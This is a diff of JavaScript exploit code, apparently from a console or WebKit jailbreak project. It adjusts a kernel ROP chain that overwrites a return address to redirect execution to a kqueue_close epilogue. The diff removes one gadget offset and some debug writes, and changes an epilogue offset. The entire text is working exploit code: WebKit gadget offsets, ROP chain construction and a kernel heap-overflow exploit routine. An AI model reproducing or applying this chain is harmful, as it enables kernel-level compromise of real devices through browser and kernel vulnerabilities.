@@ -176,7 +176,6 @@ const webkit_gadget_offsets = new Map(Object.entries({
     'push rsp; jmp qword ptr [rax]' : 0x0000000001abbc92,
     'add rcx, rsi; and rdx, rcx; or rax, rdx; ret' : 0x0000000000b8bc06,
     'pop rdi; jmp qword ptr [rax + 0x50]' : 0x00000000021f9e8e,
-    'add rax, 8; ret': 0x0000000000468988,
 
     'mov qword ptr [rdi], rsi; ret' : 0x0000000000034a40,
     'mov rax, qword ptr [rax]; ret' : 0x000000000002dc62,
@@ -737,8 +736,7 @@ function prepare_knote(kchain) {
 
     // offset relative to the return address
     // kqueue_close() epilogue
-    //const offset_kqueue_close_epi = 436;
-    const offset_kqueue_close_epi = 689;
+    const offset_kqueue_close_epi = 436;
 
     kchain.push_save();
 
@@ -747,26 +745,20 @@ function prepare_knote(kchain) {
 
     // get kernel stack pointer
     kchain.push_gadget('xchg rbp, rax; ret');
-    // ret_addr = *(rbp + 8)
-    kchain.push_gadget('add rax, 8; ret');
     kchain.push_get_retval();
+
+    // ret_addr = *rbp
     kchain.push_gadget('mov rax, qword ptr [rax]; ret');
     // ret_addr += offset_kqueue_close_epi
     kchain.push_gadget('pop rdx; ret');
     kchain.push_constant(offset_kqueue_close_epi);
     kchain.push_gadget('add rax, rdx; ret');
     // modify return address to jump to the epilogue
-    // *(rbp + 8) = ret_addr
+    // *rbp = ret_addr
     kchain.push_gadget('pop rcx; ret');
     kchain.push_value(kchain.retval_addr);
     kchain.push_gadget('mov rdx, qword ptr [rcx]; ret');
     kchain.push_gadget('mov qword ptr [rdx], rax; mov al, 1; ret');
-
-    kchain.push_gadget('pop rdi; ret');
-    kchain.push_constant(0x4000);
-    kchain.push_gadget('pop rsi; ret');
-    kchain.push_constant("0xdeadbeefbeefdead");
-    kchain.push_gadget('mov qword ptr [rdi], rsi; ret');
 
     kchain.push_restore();
     // Small chance the ghetto SMAP catches us lacking since we haven't pivoted
@@ -865,8 +857,6 @@ function kexploit() {
 
     const kretval = kchain.return_value;
     debug_log(`kchain retval: ${kretval}`);
-    debug_log(kchain.jmp_buf);
-    debug_log(new Addr(0x4000).read64(0));
     if (kretval.low() === 0 && kretval.high() === 0) {
         die('heap overflow failed');
     }
